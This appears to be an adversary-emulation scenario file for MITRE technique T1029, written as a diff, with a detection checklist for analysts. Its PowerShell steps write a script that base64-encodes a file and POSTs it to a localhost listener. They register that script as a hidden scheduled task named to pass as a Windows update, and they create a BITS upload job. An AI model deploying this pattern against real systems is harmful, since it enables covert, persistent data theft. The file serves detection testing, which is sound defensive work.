@@ -1,0 +1,113 @@
+id: T1029_scheduled_transfer
+name: "Scheduled Transfer"
+mitre_technique: "T1029"
+mitre_tactic: "exfiltration"
+description: >
+  Adversaries schedule exfiltration to occur at specific times or intervals —
+  typically during business hours to blend with normal traffic, at night when
+  security monitoring may be reduced, or at regular beacon intervals. This avoids
+  large burst transfers that trigger volume-based alerts. Methods: Windows Task
+  Scheduler (schtasks), PowerShell scheduled jobs, BITS transfers with a scheduled
+  start time, or a sleep loop within a persistent implant. Combined with size limits
+  (T1030), scheduled transfer produces a low-and-slow pattern that is the hardest
+  exfiltration pattern to detect.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1029/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1029 — Scheduled Transfer simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Create a scheduled task that performs periodic exfiltration"
+    command: |
+      $scriptPath = "$env:TEMP\PAS_T1029_exfil_script.ps1"
+      Set-Content $scriptPath @'
+# PAS T1029 — Scheduled exfiltration script
+$payload = "$env:TEMP\PAS_T1029_data.txt"
+"PAS-T1029-SCHEDULED-EXFIL-$(Get-Date -Format o)" | Set-Content $payload
+$encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes($payload))
+try {
+    $req = [System.Net.WebRequest]::Create("http://127.0.0.1:8080/scheduled")
+    $req.Method = "POST"
+    $req.ContentType = "application/octet-stream"
+    $req.Timeout = 500
+    $body = [Text.Encoding]::UTF8.GetBytes($encoded)
+    $req.ContentLength = $body.Length
+    $s = $req.GetRequestStream(); $s.Write($body,0,$body.Length); $s.Close()
+    $req.GetResponse() | Out-Null
+} catch {}
+'@
+      Write-Host "[PAS] Exfiltration script created: $scriptPath"
+
+      # Register scheduled task to run every 4 hours
+      $action   = New-ScheduledTaskAction -Execute "powershell.exe" `
+          -Argument "-NonInteractive -WindowStyle Hidden -File $scriptPath"
+      $trigger  = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Hours 4) `
+          -Once -At (Get-Date).AddSeconds(30)
+      $settings = New-ScheduledTaskSettingsSet -Hidden $true -ExecutionTimeLimit 0
+
+      Register-ScheduledTask -TaskName "PAS_T1029_WindowsUpdateSync" `
+          -Action $action -Trigger $trigger -Settings $settings `
+          -Force -ErrorAction SilentlyContinue | Out-Null
+      Write-Host "[PAS] Scheduled task registered: PAS_T1029_WindowsUpdateSync"
+      Write-Host "[PAS] Runs every 4 hours — exfiltrates accumulated data in time window"
+      Write-Host "[PAS] Hidden=`$true — not visible in Task Scheduler GUI"
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate BITS scheduled transfer — stealthy background exfiltration"
+    command: |
+      Write-Host "[PAS] BITS scheduled transfer pattern:"
+      $bitsJob = "PAS_T1029_BITSExfil"
+      # Create a BITS upload job (cancelled immediately — just for telemetry)
+      bitsadmin /create /upload $bitsJob 2>&1 | Out-Null
+      bitsadmin /setnotifyflags $bitsJob 1 2>&1 | Out-Null
+      Write-Host "[PAS] BITS upload job created: $bitsJob"
+      Write-Host "[PAS] Real: BITS uploads at low priority during idle time, bypassing proxy"
+      bitsadmin /cancel $bitsJob 2>&1 | Out-Null
+      Write-Host "[PAS] BITS job cancelled (lab safety)"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — Event ID 4698 (scheduled task created) with powershell hidden exfil script, BITS upload job creation"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove scheduled task, exfil script, and BITS job"
+    command: |
+      Unregister-ScheduledTask -TaskName "PAS_T1029_WindowsUpdateSync" `
+          -Confirm:$false -ErrorAction SilentlyContinue
+      bitsadmin /cancel "PAS_T1029_BITSExfil" 2>&1 | Out-Null
+      Remove-Item "$env:TEMP\PAS_T1029_exfil_script.ps1" -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\PAS_T1029_data.txt"         -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Scheduled transfer task and artifacts removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1029 cleanup complete"
+
+analyst_checklist:
+  - "Event ID 4698: scheduled task created with powershell.exe payload pointing to exfil script"
+  - "File event: .ps1 exfiltration script created in TEMP"
+  - "Network event: periodic outbound POST at regular intervals matching task schedule"
+  - "Sentinel: DeviceEvents | where ActionType == 'ScheduledTaskCreated' and AdditionalFields contains 'powershell'"
+  - "Sentinel: DeviceEvents | where ActionType == 'BitsJobCreated'"
+  - "MDE alert: 'Scheduled exfiltration task registered'"
+  - "CONTROL CHECK: Scheduled task baseline — flag any task created outside approved deployment pipeline with a script payload"
+  - "CONTROL CHECK: BITS monitoring — DeviceEvents BitsJobCreated with external RemoteUrl is a strong exfil indicator"
+  - "CONTROL CHECK: Scheduled transfer detection: same source IP + same destination + consistent interval = scheduled transfer pattern"
